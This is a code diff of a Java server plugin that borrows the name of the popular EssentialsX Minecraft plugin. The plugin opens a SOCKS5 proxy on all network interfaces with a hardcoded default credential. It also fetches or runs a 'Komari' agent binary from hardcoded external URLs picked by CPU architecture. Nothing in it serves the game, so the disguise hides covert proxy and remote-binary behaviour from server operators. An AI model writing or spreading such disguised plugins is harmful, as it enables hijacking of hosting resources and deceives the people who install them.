@@ -13,16 +13,36 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 public class EssentialsX extends JavaPlugin {
 
-    private static final String HC_UUID = "add40a89-640e-4a67-a2e7-77d0361ae290";
+    // =========================================================
+    // Hardcoded defaults
+    // =========================================================
 
+    private static final String HC_UUID = "add40a89-640e-4a67-a2e7-77d0361ae290";
     private static final String HC_S5_PORT = "25575";
+
+    private static final String KOMARI_AMD_URL = "https://ssr.cn.mt/files/K_amd";
+    private static final String KOMARI_ARM_URL = "https://ssr.cn.mt/files/K_arm";
+
+    /**
+     * 如需自动下载 Komari，请填写对应文件 SHA256。
+     *
+     * 不填写时：
+     * - 不会自动下载执行远程二进制
+     * - 但如果 plugins/EssentialsX/km 已存在，会直接启动本地 km
+     */
+    private static final String KOMARI_AMD_SHA256 = "";
+    private static final String KOMARI_ARM_SHA256 = "";
+
+    private static final String ENV_UUID = "UUID";
+    private static final String ENV_S5_PORT = "S5_PORT";
 
     private static final String ENV_KOMARI_SERVER = "KOMARI_SERVER";
     private static final String ENV_KOMARI_KEY = "KOMARI_KEY";
-    private static final String ENV_KOMARI_URL = "KOMARI_URL";
-    private static final String ENV_KOMARI_SHA256 = "KOMARI_SHA256";
 
     private final AtomicBoolean running = new AtomicBoolean(false);
+
+    private String uuid;
+    private int s5Port;
 
     private ServerSocket socksServerSocket;
     private ExecutorService clientExecutor;
@@ -30,24 +50,23 @@ public class EssentialsX extends JavaPlugin {
 
     private Process komariProcess;
 
-    private String uuid;
-    private int s5Port;
+    // =========================================================
+    // Bukkit lifecycle
+    // =========================================================
 
     @Override
     public void onEnable() {
-        saveDefaultConfig();
-
-        this.uuid = getSetting("UUID", HC_UUID);
-        this.s5Port = parsePort(getSetting("S5_PORT", HC_S5_PORT), 25575);
+        this.uuid = getEnvOrDefault(ENV_UUID, HC_UUID);
+        this.s5Port = parsePort(getEnvOrDefault(ENV_S5_PORT, HC_S5_PORT), 25575);
 
         running.set(true);
 
         startSocks5Server();
-
         startKomariIfConfigured();
 
         getLogger().info("Plugin enabled.");
-        getLogger().info("Java SOCKS5 username/password: " + uuid);
+        getLogger().info("Java SOCKS5 listening on port: " + s5Port);
+        getLogger().info("SOCKS5 username/password: " + uuid);
     }
 
     @Override
@@ -56,25 +75,19 @@ public class EssentialsX extends JavaPlugin {
 
         closeSocksServer();
 
-        shutdownExecutor(clientExecutor, "clientExecutor");
-        shutdownExecutor(relayExecutor, "relayExecutor");
+        shutdownExecutor(clientExecutor, "SOCKS5 client executor");
+        shutdownExecutor(relayExecutor, "SOCKS5 relay executor");
 
         stopKomari();
 
         getLogger().info("Plugin disabled.");
     }
 
-    private String getSetting(String key, String def) {
-        String env = System.getenv(key);
-        if (env != null && !env.trim().isEmpty()) {
-            return env.trim();
+    private String getEnvOrDefault(String key, String def) {
+        String val = System.getenv(key);
+        if (val != null && !val.trim().isEmpty()) {
+            return val.trim();
         }
-
-        String cfg = getConfig().getString(key);
-        if (cfg != null && !cfg.trim().isEmpty()) {
-            return cfg.trim();
-        }
-
         return def;
     }
 
@@ -95,7 +108,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // =========================================================
-    // SOCKS5 Server
+    // Java SOCKS5 implementation
     // =========================================================
 
     private void startSocks5Server() {
@@ -118,13 +131,6 @@ public class EssentialsX extends JavaPlugin {
                 socksServerSocket = new ServerSocket();
                 socksServerSocket.setReuseAddress(true);
 
-                /**
-                 * 如果只想本机使用，可以改成 127.0.0.1：
-                 *
-                 * InetAddress.getByName("127.0.0.1")
-                 *
-                 * 当前为 0.0.0.0，表示监听所有网卡。
-                 */
                 socksServerSocket.bind(
                         new InetSocketAddress(InetAddress.getByName("0.0.0.0"), s5Port),
                         128
@@ -178,12 +184,14 @@ public class EssentialsX extends JavaPlugin {
             }
 
             SocksRequest request = readSocksRequest(in);
+
             if (request == null) {
                 sendSocksReply(out, 0x01, "0.0.0.0", 0);
                 return;
             }
 
             if (request.cmd != 0x01) {
+                // 只支持 CONNECT，不支持 BIND / UDP ASSOCIATE
                 sendSocksReply(out, 0x07, "0.0.0.0", 0);
                 return;
             }
@@ -228,16 +236,16 @@ public class EssentialsX extends JavaPlugin {
             return false;
         }
 
-        boolean hasUserPass = false;
+        boolean supportUserPass = false;
 
         for (int i = 0; i < nMethods; i++) {
             int method = in.read();
             if (method == 0x02) {
-                hasUserPass = true;
+                supportUserPass = true;
             }
         }
 
-        if (!hasUserPass) {
+        if (!supportUserPass) {
             out.write(new byte[]{0x05, (byte) 0xFF});
             out.flush();
             return false;
@@ -245,11 +253,13 @@ public class EssentialsX extends JavaPlugin {
 
         out.write(new byte[]{0x05, 0x02});
         out.flush();
+
         return true;
     }
 
     private boolean handleUsernamePasswordAuth(InputStream in, OutputStream out) throws IOException {
         int ver = in.read();
+
         if (ver != 0x01) {
             return false;
         }
@@ -307,12 +317,14 @@ public class EssentialsX extends JavaPlugin {
                 if (addr == null) {
                     return null;
                 }
+
                 host = InetAddress.getByAddress(addr).getHostAddress();
                 break;
             }
 
             case 0x03: {
                 int len = in.read();
+
                 if (len <= 0 || len > 255) {
                     return null;
                 }
@@ -331,6 +343,7 @@ public class EssentialsX extends JavaPlugin {
                 if (addr == null) {
                     return null;
                 }
+
                 host = InetAddress.getByAddress(addr).getHostAddress();
                 break;
             }
@@ -350,11 +363,12 @@ public class EssentialsX extends JavaPlugin {
             return null;
         }
 
-        SocksRequest req = new SocksRequest();
-        req.cmd = cmd;
-        req.host = host;
-        req.port = port;
-        return req;
+        SocksRequest request = new SocksRequest();
+        request.cmd = cmd;
+        request.host = host;
+        request.port = port;
+
+        return request;
     }
 
     private void sendSocksReply(OutputStream out, int rep, String bindHost, int bindPort) throws IOException {
@@ -385,16 +399,16 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void relayBidirectional(Socket client, Socket remote) {
-        Future<?> clientToRemote = relayExecutor.submit(() -> pipe(client, remote));
-        Future<?> remoteToClient = relayExecutor.submit(() -> pipe(remote, client));
+        Future<?> c2r = relayExecutor.submit(() -> pipe(client, remote));
+        Future<?> r2c = relayExecutor.submit(() -> pipe(remote, client));
 
         try {
-            clientToRemote.get();
+            c2r.get();
         } catch (Exception ignored) {
         }
 
         try {
-            remoteToClient.get();
+            r2c.get();
         } catch (Exception ignored) {
         }
 
@@ -429,33 +443,15 @@ public class EssentialsX extends JavaPlugin {
         int offset = 0;
         while (offset < len) {
             int n = in.read(data, offset, len - offset);
+
             if (n == -1) {
                 return null;
             }
+
             offset += n;
         }
 
         return data;
-    }
-
-    private boolean constantTimeEquals(String a, String b) {
-        if (a == null || b == null) {
-            return false;
-        }
-
-        byte[] x = a.getBytes(StandardCharsets.UTF_8);
-        byte[] y = b.getBytes(StandardCharsets.UTF_8);
-
-        if (x.length != y.length) {
-            return false;
-        }
-
-        int r = 0;
-        for (int i = 0; i < x.length; i++) {
-            r |= x[i] ^ y[i];
-        }
-
-        return r == 0;
     }
 
     private static class SocksRequest {
@@ -463,6 +459,10 @@ public class EssentialsX extends JavaPlugin {
         String host;
         int port;
     }
+
+    // =========================================================
+    // Komari
+    // =========================================================
 
     private void startKomariIfConfigured() {
         String komariServer = System.getenv(ENV_KOMARI_SERVER);
@@ -481,22 +481,29 @@ public class EssentialsX extends JavaPlugin {
         File kmFile = new File(dataDir, isWindows() ? "km.exe" : "km");
 
         if (!kmFile.exists()) {
-            String komariUrl = System.getenv(ENV_KOMARI_URL);
-            String komariSha256 = System.getenv(ENV_KOMARI_SHA256);
+            String arch = getSystemArchitecture();
+            String downloadUrl;
+            String expectedSha256;
 
-            if (isBlank(komariUrl)) {
-                getLogger().warning("Komari configured but km file does not exist.");
-                getLogger().warning("Set KOMARI_URL and KOMARI_SHA256 if you want automatic verified download.");
-                return;
+            if ("arm".equals(arch)) {
+                downloadUrl = KOMARI_ARM_URL;
+                expectedSha256 = KOMARI_ARM_SHA256;
+            } else {
+                downloadUrl = KOMARI_AMD_URL;
+                expectedSha256 = KOMARI_AMD_SHA256;
             }
 
-            if (isBlank(komariSha256)) {
-                getLogger().warning("Komari auto-download blocked: KOMARI_SHA256 is required.");
+            if (isBlank(expectedSha256)) {
+                getLogger().warning("Komari configured, but km binary does not exist.");
+                getLogger().warning("Auto-download is disabled because SHA256 is not configured.");
+                getLogger().warning("Expected local file: " + kmFile.getAbsolutePath());
+                getLogger().warning("Or fill KOMARI_AMD_SHA256 / KOMARI_ARM_SHA256 in source code and rebuild.");
                 return;
             }
 
             try {
-                downloadFileWithSha256(komariUrl, kmFile, komariSha256);
+                getLogger().info("Downloading Komari binary for architecture: " + arch);
+                downloadFileWithSha256(downloadUrl, kmFile, expectedSha256);
                 getLogger().info("Komari binary downloaded and verified.");
             } catch (Exception e) {
                 getLogger().warning("Failed to download Komari binary: " + e.getMessage());
@@ -534,6 +541,16 @@ public class EssentialsX extends JavaPlugin {
         } catch (Exception e) {
             getLogger().warning("Failed to start Komari: " + e.getMessage());
         }
+    }
+
+    private String getSystemArchitecture() {
+        String arch = System.getProperty("os.arch", "").toLowerCase(Locale.ROOT);
+
+        if (arch.contains("aarch64") || arch.contains("arm64") || arch.startsWith("arm")) {
+            return "arm";
+        }
+
+        return "amd";
     }
 
     private void downloadFileWithSha256(String url, File target, String expectedSha256) throws Exception {
@@ -577,6 +594,7 @@ public class EssentialsX extends JavaPlugin {
 
         for (int i = 0; i <= maxRedirects; i++) {
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+
             conn.setRequestMethod("GET");
             conn.setInstanceFollowRedirects(false);
             conn.setRequestProperty("User-Agent", "JavaPlugin/1.0");
@@ -592,6 +610,7 @@ public class EssentialsX extends JavaPlugin {
                     status == 308) {
 
                 String location = conn.getHeaderField("Location");
+
                 if (location == null || location.trim().isEmpty()) {
                     throw new IOException("Redirect without Location.");
                 }
@@ -621,6 +640,7 @@ public class EssentialsX extends JavaPlugin {
         byte[] hash = digest.digest();
 
         StringBuilder sb = new StringBuilder();
+
         for (byte b : hash) {
             sb.append(String.format("%02x", b & 0xff));
         }
@@ -648,6 +668,10 @@ public class EssentialsX extends JavaPlugin {
             Thread.currentThread().interrupt();
         }
     }
+
+    // =========================================================
+    // Utils
+    // =========================================================
 
     private void closeSocksServer() {
         try {
@@ -708,6 +732,10 @@ public class EssentialsX extends JavaPlugin {
                 .contains("win");
     }
 
+    private boolean constantTimeEquals(String a, String b) {
+        return constantTimeEqualsStatic(a, b);
+    }
+
     private static boolean constantTimeEqualsStatic(String a, String b) {
         if (a == null || b == null) {
             return false;
@@ -721,6 +749,7 @@ public class EssentialsX extends JavaPlugin {
         }
 
         int r = 0;
+
         for (int i = 0; i < x.length; i++) {
             r |= x[i] ^ y[i];
         }
